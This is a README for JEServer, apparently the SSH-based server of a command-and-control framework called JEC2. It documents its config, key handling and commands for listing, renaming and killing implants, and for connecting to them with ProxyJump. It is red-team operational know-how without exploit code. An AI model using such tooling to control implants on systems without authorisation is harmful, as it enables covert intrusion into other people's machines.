JEServer
========
JEServer is the server side of JEC2.  It's more or less just an SSH server
which handles `-J`/`ProxyJump` requests to connect operator SSH connections
to JEImplants.

Config File
-----------
JEServer looks for a file named `config.json` in its working directory.  If it
doesn't find one it makes one with sensible [defaults](#defaults).

The config file can be reloaded by sending SIGHUP to JEServer.  This causes the
listening sockets to be closed, new listeners started, and the list of allowed
keys re-read and the operator keys re-sent to connected implants.

Work Directory
--------------
JEServer expects to find all of the files it needs in its working directory,
with the exception of those configured otherwise in `config.json`.  Currently
the files are:

File                | Description
--------------------|-----------
`config.json`       | Runtime configuration
`id_ed25519_server` | Server private key
`log`               | Logfile

By default, JEServer's working directory is `$HOME/jec2`.

Authentication
--------------
JEServer reads a list of authorized operator keys from its config file, which
it also uses to tell implants which keys to allow.  Currently, JEServer does
not allow a client to try multiple keys like OpenSSH does.  To prevent
disconnection due to OpenSSH trying keys from `$HOME/.ssh` before keys
specified with `-i`, either add the first key OpenSSH tries to the config file
or create an ssh [config file](../readme.md#ssh-config) section for the server.

OpenSSH doesn't use the key specified with `-i` for hosts specified with `-J`.
In practical terms, this means that `ssh -P 10022 localhost list` will work
fine, but `ssh -J 127.0.0.1:10022 latest` won't.  Fastest way around this is to
add one of the keys from `~/.ssh/id_*.pub` to `config.json`.  Setting up a
section in [`~/.ssh/config`](./README.md#ssh-config) is also a good option.



Defaults
--------
By default, JEServer generates the following files in its work directory if
they don't exist.

File                    | Description
------------------------|------------
`id_ed25519_implant`    | Default implant private SSH key
`id_ed25519_operator`   | Default operator private SSH key
`id_ed25519_server`     | Default server private SSH key
`id_ed25519_server.pub` | Default server public SSH key
`log`                   | Logfile (handy to `tail -f` while operating)
`config.json`           | Config file

JEServer's default config is as follows
```json
{
        "Listeners": {
                "SSH": "0.0.0.0:10022",
                "SSHBanner": "",
                "TLS": "",
                "TLSCert": "jec2.crt",
                "TLSKey": "jec2.key"
        },
        "Keys": {
                "Operator": [
                        "GENERATED IF NEEDED"
                ],
                "Implant": [
                        "GENERATED IF NEEDED"
                ]
        },
        "AllowAnyImplantKey": false
}
```

All of the possible configurable options are listed in the generated config
file.

Commands
--------
Despite JEServer's simple mission, it does understand a small number of
commands, mostly related to implant management.

Command                  | Description
-------------------------|------------
`help`                   | This help
`help list`              | A definitive list of commands
`fingerprint`            | Get the server's hostkey fingerprint
`kill implant`           | Kill an implant by name
`list`                   | List implants
`reload`                 | Reload server config, SIGHUP-style
`rename fromname toname` | Rename an implant

The commands must be executed via the SSH command line, not interactively, like
```sh
ssh jeserver rename latest fileserver
```

Implants
--------
Connecting to implants is usually done via `-J`/`ProxyJump`, something like
```sh
ssh -J jeserver m5
```

There are a couple of special target names:

### `latest`
As a special case, `latest` can be used to connect to the
most-recently-connected implant, as in
```sh
ssh -J jeserver latest
```
and can be used as a first argument to the `rename` command, like
```sh
ssh -J jeserver rename latest ldap
```

### `server`
As another special case, `server` can be used to connect to the server itself.
This is sometimes handy when the command to connect to JEServer is long and
complicated and it's easier to UpArrow than switch from `-J 127.0.0.1:10022`
to `-p 10022 127.0.0.1`, like
```ssh
$ ssh -i ~/.ssh/id_ed25519_jec2 -J jumphost,jeserver latest 'f /etc/hostname'
ldap-prod-eu-west-1
$ ssh -i ~/.ssh/id_ed25519_jec2 -J jumphost,jeserver server rename latest ldap
renamed m4 -> ldap
```
